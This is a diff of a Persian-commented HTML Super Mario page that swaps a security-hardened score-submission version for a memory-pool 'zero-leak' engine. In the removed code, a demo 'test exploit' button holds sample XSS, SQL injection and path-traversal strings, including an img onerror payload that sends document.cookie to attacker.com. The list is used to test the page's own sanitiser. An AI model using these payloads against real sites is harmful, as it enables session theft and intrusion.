@@ -2,39 +2,20 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <!-- سخت‌گیرانه‌ترین سیاست امنیتی محتوا (CSP) برای مسدودسازی هرگونه اجرای کد ناشناس و نشت توکن -->
-    <meta http-equiv="Content-Security-Policy" content="
-        default-src 'self';
-        script-src 'self' 'unsafe-inline';
-        style-src 'self' 'unsafe-inline';
-        img-src 'self' data: blob:;
-        connect-src 'self';
-        object-src 'none';
-        base-uri 'self';
-        form-action 'self';
-    ">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Super Mario - B2.st Hardened Edition</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Super Mario - Zero Leak Engine [B2.st Studio]</title>
     <style>
-        :root {
-            --sky-blue: #5c94fc;
-            --brick-red: #b84418;
-            --ground-green: #00a800;
-            --hud-bg: rgba(0, 0, 0, 0.75);
-            --shield-active: #00ff66;
-        }
-
         * {
             box-sizing: border-box;
             user-select: none;
-        }
-
-        body {
+            -webkit-user-select: none;
             margin: 0;
             padding: 0;
-            background-color: #111;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #fff;
+        }
+        body {
+            background: #11141a;
+            color: #ecf0f1;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -42,417 +23,401 @@
             min-height: 100vh;
             overflow: hidden;
         }
-
         #game-container {
             position: relative;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8), 0 0 10px rgba(92, 148, 252, 0.4);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(231, 76, 60, 0.2);
+            border: 4px solid #2c3e50;
             border-radius: 8px;
+            background: #5c94fc;
             overflow: hidden;
-            border: 3px solid #333;
-            background: var(--sky-blue);
         }
-
         canvas {
             display: block;
-            background: var(--sky-blue);
             image-rendering: pixelated;
+            image-rendering: crisp-edges;
         }
-
-        #ui-bar {
+        #hud {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
             display: flex;
             justify-content: space-between;
-            align-items: center;
+            font-size: 15px;
+            font-weight: 800;
+            text-shadow: 2px 2px 0px #000;
+            pointer-events: none;
+            z-index: 10;
+        }
+        #dashboard {
+            margin-top: 15px;
             width: 800px;
-            background: #222;
-            padding: 10px 16px;
-            border-top: 2px solid #444;
+            background: #1e272e;
+            border-radius: 6px;
+            padding: 10px 20px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            font-size: 13px;
+            border: 1px solid #34495e;
+            direction: ltr;
+        }
+        .metric-card {
+            background: #2f3640;
+            padding: 8px;
+            border-radius: 4px;
+            border-left: 3px solid #e74c3c;
+        }
+        .metric-title {
+            color: #95a5a6;
+            font-size: 11px;
+            margin-bottom: 4px;
+        }
+        .metric-value {
+            font-weight: bold;
+            color: #00d2d3;
+            font-family: monospace;
             font-size: 14px;
         }
-
-        .hud-stat {
-            display: flex;
-            gap: 6px;
-            align-items: center;
-            font-weight: bold;
-        }
-
-        .hud-stat span {
-            color: #ffd700;
-        }
-
-        .sec-badge {
-            background: #004411;
-            color: var(--shield-active);
-            padding: 4px 10px;
-            border-radius: 4px;
-            border: 1px solid #00aa33;
-            font-size: 11px;
-            letter-spacing: 0.5px;
-        }
-
-        #score-submission-panel {
-            width: 800px;
-            background: #1a1a1a;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 2px solid #333;
-        }
-
-        input[type="text"] {
-            background: #2b2b2b;
-            border: 1px solid #444;
-            padding: 8px 12px;
-            color: #fff;
-            border-radius: 4px;
-            outline: none;
-            flex: 1;
-            font-size: 13px;
-        }
-
-        input[type="text"]:focus {
-            border-color: #5c94fc;
-        }
-
-        button {
-            background: #b84418;
-            color: white;
-            border: none;
-            padding: 8px 18px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background 0.2s;
-        }
-
-        button:hover {
-            background: #d85420;
-        }
-
-        #security-log {
-            width: 800px;
-            background: #0a0a0a;
-            color: #00ff66;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 11px;
-            padding: 8px 12px;
-            height: 60px;
-            overflow-y: auto;
-            border-bottom: 1px solid #222;
-        }
-
-        .threat-alert {
-            color: #ff3333 !important;
-            font-weight: bold;
-        }
-
-        #leaderboard {
-            width: 800px;
-            background: #181818;
-            padding: 10px 16px;
-            font-size: 13px;
-        }
-
-        #leaderboard ul {
-            list-style: none;
-            padding: 0;
-            margin: 6px 0 0 0;
-            display: flex;
-            gap: 20px;
-        }
-
-        #leaderboard li {
-            background: #242424;
-            padding: 4px 10px;
-            border-radius: 4px;
-            border-right: 3px solid #5c94fc;
+        .controls-hint {
+            margin-top: 10px;
+            color: #7f8c8d;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
 
-    <!-- نوار وضعیت امنیتی و ثبت رکورد امن -->
-    <div id="score-submission-panel">
-        <label for="player-name">شناسه بازیکن:</label>
-        <input type="text" id="player-name" maxlength="25" placeholder="نام بازیکن (تست تزریق XSS یا SQLi)">
-        <button id="btn-submit-score">ثبت امن رکورد</button>
-        <button id="btn-test-exploit" style="background:#555;">تست نفوذ XSS</button>
-    </div>
-
-    <!-- لاگ زنده فایروال نرم‌افزاری OWASP -->
-    <div id="security-log">> B2.st OWASP Guard Initialized. Sinks Protected. Ready.</div>
-
-    <!-- کانتینر بوم بازی ماریو -->
     <div id="game-container">
-        <canvas id="mario-canvas" width="800" height="400"></canvas>
+        <div id="hud">
+            <div>MARIO: <span id="score-val">000000</span></div>
+            <div>COINS: <span id="coin-val">x00</span></div>
+            <div>FPS: <span id="fps-val">60</span></div>
+            <div>STATE: <span id="state-val" style="color: #2ecc71;">STABLE</span></div>
+        </div>
+        <canvas id="gameCanvas" width="800" height="450"></canvas>
     </div>
 
-    <!-- نوار HUD وضعیت بازی -->
-    <div id="ui-bar">
-        <div class="hud-stat">ماریو: <span id="hud-score">000000</span></div>
-        <div class="hud-stat">سکه‌ها: <span id="hud-coins">00</span></div>
-        <div class="hud-stat">جهان: <span>1-1</span></div>
-        <div class="hud-stat">زمان: <span id="hud-time">400</span></div>
-        <div class="sec-badge">🛡️ OWASP ACTIVE: NO-SINK-LEAK</div>
+    <div id="dashboard">
+        <div class="metric-card">
+            <div class="metric-title">JS Heap Allocation</div>
+            <div class="metric-value" id="mem-heap">N/A</div>
+        </div>
+        <div class="metric-card">
+            <div class="metric-title">Active Timers / RAF</div>
+            <div class="metric-value" id="mem-timers">0 / 0</div>
+        </div>
+        <div class="metric-card">
+            <div class="metric-title">Recycled Pool Entities</div>
+            <div class="metric-value" id="mem-pooled">0</div>
+        </div>
+        <div class="metric-card">
+            <div class="metric-title">Active Enemies / Particles</div>
+            <div class="metric-value" id="mem-entities">0</div>
+        </div>
     </div>
 
-    <!-- تابلوی امتیازات امن -->
-    <div id="leaderboard">
-        <strong>برترین رکوردهای ثبت‌شده (ایزوله‌شده علیه Stored XSS):</strong>
-        <ul id="scores-list">
-            <li>MarioHero: 5200</li>
-            <li>Luigi_Pro: 4100</li>
-        </ul>
+    <div class="controls-hint">
+        کلیدهای جهت‌نما یا A / D برای حرکت، W یا Space برای پرش | کلید R برای بازنشانی امن مرحله (Purge & Reset)
     </div>
 
-    <!-- لود ماژول فایروال امنیتی OWASP -->
-    <script src="src/security/owasp_guard.js"></script>
+    <!-- بارگذاری موتور محافظت حافظه B2.st -->
+    <script src="src/core/memory_guard.js"></script>
 
-    <!-- موتور بازی ماریو ایمن‌سازی‌شده -->
+    <!-- موتور بازی ماریو بدون نشت حافظه (Zero-Leak Mario Core) -->
     <script>
+        'use strict';
+
         (function () {
-            'use strict';
-
-            const logElement = document.getElementById('security-log');
-
-            function appendLog(message, isThreat = false) {
-                const entry = document.createElement('div');
-                if (isThreat) entry.classList.add('threat-alert');
-                entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-                logElement.appendChild(entry);
-                logElement.scrollTop = logElement.scrollHeight;
-            }
-
-            // ۱. تنظیم نشست امن با کلید درون حافظه (Memory Vault)
-            async function bootstrapSecuritySession() {
-                try {
-                    // شبیه‌سازی دریافت توکن محرمانه از بک‌اند
-                    const mockSecureJwt = 'b2st_session_token_' + Math.random().toString(36).substring(2);
-                    await OwaspGuard.Vault.setSessionToken(mockSecureJwt, 1800000);
-                    OwaspGuard.Vault.setCsrfToken('csrf_token_' + Math.random().toString(36).substring(2));
-                    appendLog('Secure In-Memory Token Vault successfully primed. No webStorage tokens.');
-                } catch (err) {
-                    appendLog('Failed to seed session token: ' + err.message, true);
-                }
-            }
-            bootstrapSecuritySession();
-
-            // ۲. موتور بازی کلاسیک ماریو بر بستر HTML5 Canvas
-            const canvas = document.getElementById('mario-canvas');
-            const ctx = canvas.getContext('2d');
-
-            const GAME = {
-                score: 0,
-                coins: 0,
-                time: 400,
-                gravity: 0.45,
-                friction: 0.82
-            };
-
-            const mario = {
-                x: 50,
-                y: 300,
-                w: 24,
-                h: 32,
-                vx: 0,
-                vy: 0,
-                speed: 4.5,
-                jumpForce: -11.5,
-                grounded: false,
-                color: '#d62d20'
-            };
-
-            const platforms = [
-                { x: 0, y: 360, w: 1200, h: 40, type: 'ground' },
-                { x: 180, y: 260, w: 80, h: 20, type: 'brick' },
-                { x: 300, y: 200, w: 100, h: 20, type: 'question' },
-                { x: 440, y: 260, w: 80, h: 20, type: 'brick' },
-                { x: 580, y: 160, w: 60, h: 20, type: 'question' }
-            ];
-
-            const coinsList = [
-                { x: 320, y: 160, collected: false },
-                { x: 360, y: 160, collected: false },
-                { x: 600, y: 120, collected: false }
-            ];
-
-            const keys = {};
-
-            window.addEventListener('keydown', (e) => {
-                keys[e.code] = true;
+            // ۱. راه‌اندازی نگهبان حافظه
+            const guard = new MemoryGuard({
+                debugMode: true,
+                maxHeapThresholdMB: 150,
+                alertThresholdMB: 100
             });
 
-            window.addEventListener('keyup', (e) => {
-                keys[e.code] = false;
-            });
+            const canvas = document.getElementById('gameCanvas');
+            const ctx = canvas.getContext('2d', { alpha: false }); // غیرفعال کردن alpha برای شتاب‌بخشی سخت‌افزاری
 
-            function updateGame() {
-                // کنترل حرکت
-                if (keys['ArrowRight'] || keys['KeyD']) {
-                    if (mario.vx < mario.speed) mario.vx++;
+            // المنت‌های HUD
+            const scoreVal = document.getElementById('score-val');
+            const coinVal = document.getElementById('coin-val');
+            const fpsVal = document.getElementById('fps-val');
+            const memHeap = document.getElementById('mem-heap');
+            const memTimers = document.getElementById('mem-timers');
+            const memPooled = document.getElementById('mem-pooled');
+            const memEntities = document.getElementById('mem-entities');
+
+            // وضعیت ورودی‌ها
+            const keys = { right: false, left: false, jump: false };
+
+            // تنظیم استخر ذرات (Particle Pool) برای جلوگیری از allocation در هنگام دویدن و انفجار
+            guard.registerPool(
+                'particles',
+                [],
+                () => ({ x: 0, y: 0, vx: 0, vy: 0, size: 4, life: 1, color: '#f39c12' }),
+                (p) => { p.life = 1; p.vx = 0; p.vy = 0; }
+            );
+
+            // کلاس ایزوله ماریو
+            class Player {
+                constructor() {
+                    this.reset();
                 }
-                if (keys['ArrowLeft'] || keys['KeyA']) {
-                    if (mario.vx > -mario.speed) mario.vx--;
+
+                reset() {
+                    this.x = 80;
+                    this.y = 330;
+                    this.w = 28;
+                    this.h = 36;
+                    this.vx = 0;
+                    this.vy = 0;
+                    this.speed = 4.2;
+                    this.jumpForce = -11.5;
+                    this.gravity = 0.52;
+                    this.grounded = false;
+                    this.score = 0;
+                    this.coins = 0;
                 }
-                if ((keys['ArrowUp'] || keys['KeyW'] || keys['Space']) && mario.grounded) {
-                    mario.vy = mario.jumpForce;
-                    mario.grounded = false;
+
+                update() {
+                    if (keys.right) this.vx = this.speed;
+                    else if (keys.left) this.vx = -this.speed;
+                    else this.vx *= 0.78; // اصطکاک
+
+                    if (keys.jump && this.grounded) {
+                        this.vy = this.jumpForce;
+                        this.grounded = false;
+                        spawnDust(this.x + this.w / 2, this.y + this.h);
+                    }
+
+                    this.vy += this.gravity;
+                    this.x += this.vx;
+                    this.y += this.vy;
+
+                    // برخورد با زمین
+                    if (this.y >= 350) {
+                        this.y = 350;
+                        this.vy = 0;
+                        this.grounded = true;
+                    }
+
+                    // مهار خروج از کادر
+                    if (this.x < 0) this.x = 0;
+                    if (this.x > canvas.width - this.w) this.x = canvas.width - this.w;
                 }
 
-                mario.vx *= GAME.friction;
-                mario.vy += GAME.gravity;
+                render(context) {
+                    context.fillStyle = '#e74c3c'; // کلاه و لباس
+                    context.fillRect(this.x, this.y, this.w, this.h);
+                    context.fillStyle = '#2980b9'; // اورال آبی
+                    context.fillRect(this.x + 4, this.y + 18, this.w - 8, 18);
+                    context.fillStyle = '#f1c40f'; // سگک زرد
+                    context.fillRect(this.x + 8, this.y + 22, 4, 4);
+                    context.fillRect(this.x + 16, this.y + 22, 4, 4);
+                }
+            }
 
-                mario.x += mario.vx;
-                mario.y += mario.vy;
+            // کلاس گومبا (Goomba) با متد چرخه حیات تمیز
+            class Goomba {
+                constructor(x) {
+                    this.x = x;
+                    this.y = 356;
+                    this.w = 26;
+                    this.h = 26;
+                    this.vx = -1.2;
+                    this.isDead = false;
+                }
 
-                // مرز چپ بازی
-                if (mario.x < 0) mario.x = 0;
-
-                // بررسی برخورد با پلتفرم‌ها
-                mario.grounded = false;
-                for (let plat of platforms) {
-                    if (
-                        mario.x < plat.x + plat.w &&
-                        mario.x + mario.w > plat.x &&
-                        mario.y + mario.h > plat.y &&
-                        mario.y + mario.h < plat.y + plat.h + mario.vy
-                    ) {
-                        mario.grounded = true;
-                        mario.vy = 0;
-                        mario.y = plat.y - mario.h;
+                update() {
+                    this.x += this.vx;
+                    if (this.x < -40) {
+                        this.x = canvas.width + Math.random() * 200;
                     }
                 }
 
-                // برخورد با سکه‌ها
-                coinsList.forEach(coin => {
-                    if (!coin.collected) {
-                        const dist = Math.hypot((mario.x + mario.w / 2) - coin.x, (mario.y + mario.h / 2) - coin.y);
-                        if (dist < 20) {
-                            coin.collected = true;
-                            GAME.coins += 1;
-                            GAME.score += 200;
-                            document.getElementById('hud-score').textContent = String(GAME.score).padStart(6, '0');
-                            document.getElementById('hud-coins').textContent = String(GAME.coins).padStart(2, '0');
+                render(context) {
+                    if (this.isDead) return;
+                    context.fillStyle = '#795548';
+                    context.fillRect(this.x, this.y, this.w, this.h);
+                    context.fillStyle = '#ffffff';
+                    context.fillRect(this.x + 4, this.y + 4, 5, 5);
+                    context.fillRect(this.x + 16, this.y + 4, 5, 5);
+                    context.fillStyle = '#000';
+                    context.fillRect(this.x + 6, this.y + 6, 2, 2);
+                    context.fillRect(this.x + 18, this.y + 6, 2, 2);
+                }
+
+                dispose() {
+                    this.isDead = true;
+                }
+            }
+
+            // متغیرهای وضعیت بازی
+            const player = new Player();
+            let enemies = [];
+            let activeParticles = [];
+            let lastTime = performance.now();
+            let frames = 0;
+            let fpsLastCheck = performance.now();
+
+            function initWorld() {
+                // پاک‌سازی تمامی ارجاعات قبلی
+                enemies.forEach(e => e.dispose());
+                enemies.length = 0;
+
+                // بازگردانی ذرات به استخر
+                for (let i = 0; i < activeParticles.length; i++) {
+                    guard.releaseToPool('particles', activeParticles[i]);
+                }
+                activeParticles.length = 0;
+
+                // ایجاد دشمن‌ها
+                enemies.push(new Goomba(500));
+                enemies.push(new Goomba(750));
+                enemies.push(new Goomba(1050));
+            }
+
+            function spawnDust(x, y) {
+                for (let i = 0; i < 4; i++) {
+                    const p = guard.obtainFromPool('particles');
+                    p.x = x;
+                    p.y = y;
+                    p.vx = (Math.random() - 0.5) * 3;
+                    p.vy = -Math.random() * 2.5;
+                    p.life = 1.0;
+                    activeParticles.push(p);
+                }
+            }
+
+            // لیسنرهای کیبورد با safeAddEventListener
+            guard.safeAddEventListener(window, 'keydown', (e) => {
+                if (e.code === 'KeyD' || e.code === 'ArrowRight') keys.right = true;
+                if (e.code === 'KeyA' || e.code === 'ArrowLeft') keys.left = true;
+                if (e.code === 'KeyW' || e.code === 'ArrowUp' || e.code === 'Space') keys.jump = true;
+                if (e.code === 'KeyR') {
+                    // شبیه‌سازی ریست مرحله با تخلیه صفر نشت
+                    guard.sceneTransitionPurge();
+                    player.reset();
+                    initWorld();
+                }
+            });
+
+            guard.safeAddEventListener(window, 'keyup', (e) => {
+                if (e.code === 'KeyD' || e.code === 'ArrowRight') keys.right = false;
+                if (e.code === 'KeyA' || e.code === 'ArrowLeft') keys.left = false;
+                if (e.code === 'KeyW' || e.code === 'ArrowUp' || e.code === 'Space') keys.jump = false;
+            });
+
+            // تایمر دوره‌ای امن برای مانیتور وضعیت سلامت رم و هیپ
+            guard.safeInterval(() => {
+                guard.checkMemoryUsage();
+                const metrics = guard.getMetrics();
+
+                memTimers.innerText = `${metrics.activeTimeouts + metrics.activeIntervals} / ${metrics.activeRAF}`;
+                memPooled.innerText = `${metrics.reclaimedEntitiesCount}`;
+                memEntities.innerText = `${enemies.length} / ${activeParticles.length}`;
+
+                if (window.performance && window.performance.memory) {
+                    memHeap.innerText = `${metrics.lastHeapSizeMB} MB`;
+                } else {
+                    memHeap.innerText = "N/A (Non-Chromium)";
+                }
+            }, 500);
+
+            // تایمر افزایش سکه و امتیاز جهت شبیه‌سازی منطق بازی
+            guard.safeInterval(() => {
+                player.score += 10;
+                scoreVal.innerText = String(player.score).padStart(6, '0');
+            }, 1000);
+
+            // حلقه اصلی رندر و آپدیت با گارد ضد خفگی (Delta-Time Cap & Safe RAF)
+            function gameLoop(timestamp) {
+                const delta = Math.min(timestamp - lastTime, 33.3); // سقف فریم برای جلوگیری از افت حافظه تجمعی
+                lastTime = timestamp;
+
+                // محاسبه FPS
+                frames++;
+                if (timestamp - fpsLastCheck >= 1000) {
+                    fpsVal.innerText = frames;
+                    frames = 0;
+                    fpsLastCheck = timestamp;
+                }
+
+                // ۱. منطق بازی (Update)
+                player.update();
+
+                for (let i = 0; i < enemies.length; i++) {
+                    const e = enemies[i];
+                    e.update();
+
+                    // برخورد ساده ماریو با دشمن (له کردن یا مرگ)
+                    if (Math.abs(player.x - e.x) < 24 && Math.abs(player.y - e.y) < 24) {
+                        if (player.vy > 0 && player.y < e.y) {
+                            // له شدن گومبا
+                            e.x = canvas.width + 100;
+                            player.vy = -7;
+                            player.score += 100;
+                            player.coins += 1;
+                            coinVal.innerText = `x${String(player.coins).padStart(2, '0')}`;
+                            spawnDust(e.x, e.y);
+                        } else {
+                            // برخورد معمولی
+                            player.reset();
                         }
                     }
-                });
+                }
 
-                // دوربین تعقیب‌کننده
-                let cameraOffset = Math.max(0, mario.x - 300);
+                // به‌روزرسانی ذرات با استفاده مجدد از آبجکت‌ها
+                for (let i = activeParticles.length - 1; i >= 0; i--) {
+                    const p = activeParticles[i];
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    p.life -= 0.04;
 
-                // رندرینگ فریم
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.save();
-                ctx.translate(-cameraOffset, 0);
-
-                // رسم پلتفرم‌ها و زمین
-                platforms.forEach(plat => {
-                    if (plat.type === 'ground') {
-                        ctx.fillStyle = '#b84418';
-                        ctx.fillRect(plat.x, plat.y, plat.w, plat.h);
-                        ctx.fillStyle = '#00a800';
-                        ctx.fillRect(plat.x, plat.y, plat.w, 8);
-                    } else if (plat.type === 'brick') {
-                        ctx.fillStyle = '#b84418';
-                        ctx.fillRect(plat.x, plat.y, plat.w, plat.h);
-                        ctx.strokeStyle = '#000';
-                        ctx.strokeRect(plat.x, plat.y, plat.w, plat.h);
-                    } else if (plat.type === 'question') {
-                        ctx.fillStyle = '#fcb040';
-                        ctx.fillRect(plat.x, plat.y, plat.w, plat.h);
-                        ctx.fillStyle = '#fff';
-                        ctx.font = 'bold 12px monospace';
-                        ctx.fillText('?', plat.x + plat.w / 2 - 4, plat.y + 14);
+                    if (p.life <= 0) {
+                        guard.releaseToPool('particles', p);
+                        // Swap and pop سریع برای حذف O(1) بدون جابجایی کل آرایه در رم
+                        activeParticles[i] = activeParticles[activeParticles.length - 1];
+                        activeParticles.pop();
                     }
-                });
+                }
 
-                // رسم سکه‌ها
-                coinsList.forEach(coin => {
-                    if (!coin.collected) {
-                        ctx.fillStyle = '#ffd700';
-                        ctx.beginPath();
-                        ctx.arc(coin.x, coin.y, 8, 0, Math.PI * 2);
-                        ctx.fill();
-                        ctx.strokeStyle = '#b8860b';
-                        ctx.stroke();
-                    }
-                });
+                // ۲. رندرسازی (Render)
+                ctx.fillStyle = '#5c94fc'; // آسمان ماریو
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-                // رسم ماریو
-                ctx.fillStyle = mario.color;
-                ctx.fillRect(mario.x, mario.y, mario.w, mario.h);
-                // کلاه و جزئیات ماریو
-                ctx.fillStyle = '#002699';
-                ctx.fillRect(mario.x + 4, mario.y + 16, mario.w - 8, 12);
-                ctx.fillStyle = '#ffcca3';
-                ctx.fillRect(mario.x + 6, mario.y + 4, 14, 10);
+                // زمین
+                ctx.fillStyle = '#228b22';
+                ctx.fillRect(0, 386, canvas.width, 14);
+                ctx.fillStyle = '#8B4513';
+                ctx.fillRect(0, 400, canvas.width, 50);
 
-                ctx.restore();
+                // ابرها و دکور
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
+                ctx.fillRect(120, 80, 80, 24);
+                ctx.fillRect(450, 110, 110, 28);
 
-                requestAnimationFrame(updateGame);
+                // رندر موجودیت‌ها
+                player.render(ctx);
+                for (let i = 0; i < enemies.length; i++) {
+                    enemies[i].render(ctx);
+                }
+
+                // رندر ذرات
+                for (let i = 0; i < activeParticles.length; i++) {
+                    const p = activeParticles[i];
+                    ctx.fillStyle = `rgba(243, 156, 18, ${p.life})`;
+                    ctx.fillRect(p.x, p.y, p.size, p.size);
+                }
+
+                // درخواست فریم بعد توسط گارد امن
+                guard.safeRAF(gameLoop);
             }
 
-            requestAnimationFrame(updateGame);
-
-            // ۳. مدیریت امن ثبت رتبه و اعتبارسنجی لایه ورودی
-            document.getElementById('btn-submit-score').addEventListener('click', async () => {
-                const nameInput = document.getElementById('player-name');
-                const rawName = nameInput.value;
-
-                try {
-                    // تایید اعتبار با فایروال OWASP
-                    const securePayload = OwaspGuard.secureScorePayload(rawName, GAME.score);
-                    
-                    // استخراج ایمن توکن نشست
-                    const token = await OwaspGuard.Vault.getSessionToken();
-                    
-                    appendLog(`Payload Sanitized: Player=${securePayload.player} | Sig=${securePayload.hmacSignature} | Auth=OK`);
-
-                    // افزودن امن به تابلوی امتیازات بدون استفاده از innerHTML آسیب‌پذیر
-                    const list = document.getElementById('scores-list');
-                    const item = document.createElement('li');
-                    
-                    // استفاده از textContent جهت مسدودسازی دائمی DOM XSS
-                    item.textContent = `${securePayload.player}: ${securePayload.score}`;
-                    list.appendChild(item);
-
-                    nameInput.value = '';
-                } catch (err) {
-                    appendLog(`[DEFENSE HIT] ${err.message}`, true);
-                }
-            });
-
-            // ۴. دکمه شبیه‌ساز حمله نفوذگر برای تست تاب‌آوری WAF
-            document.getElementById('btn-test-exploit').addEventListener('click', () => {
-                const exploits = [
-                    "<script>alert('XSS_PWNED')<\/script>",
-                    "Mario' OR '1'='1' --",
-                    "<img src=x onerror=fetch('http://attacker.com?leak='+document.cookie)>",
-                    "../../etc/passwd",
-                    "Mario<svg onload=alert(1)>"
-                ];
-                const testVector = exploits[Math.floor(Math.random() * exploits.length)];
-                document.getElementById('player-name').value = testVector;
-                appendLog(`Simulating Injected Vector: ${testVector}`, true);
-            });
-
-            // ۵. پاکسازی پارامترهای URL ورودی جهت جلوگیری از Reflected DOM XSS
-            (function sanitizeURLParams() {
-                try {
-                    const urlParams = new URLSearchParams(window.location.search);
-                    const incomingPlayer = urlParams.get('player');
-                    if (incomingPlayer) {
-                        OwaspGuard.validateInput(incomingPlayer, 'URL_PARAM');
-                        document.getElementById('player-name').value = OwaspGuard.sanitizeHTML(incomingPlayer);
-                        appendLog(`Safe URL Query Parameter loaded: ${incomingPlayer}`);
-                    }
-                } catch (err) {
-                    appendLog(`Malicious URL query neutralized: ${err.message}`, true);
-                    window.history.replaceState({}, document.title, window.location.pathname);
-                }
-            })();
-
+            // آغاز اجرای بدون نشت
+            initWorld();
+            guard.safeRAF(gameLoop);
         })();
     </script>
 </body>
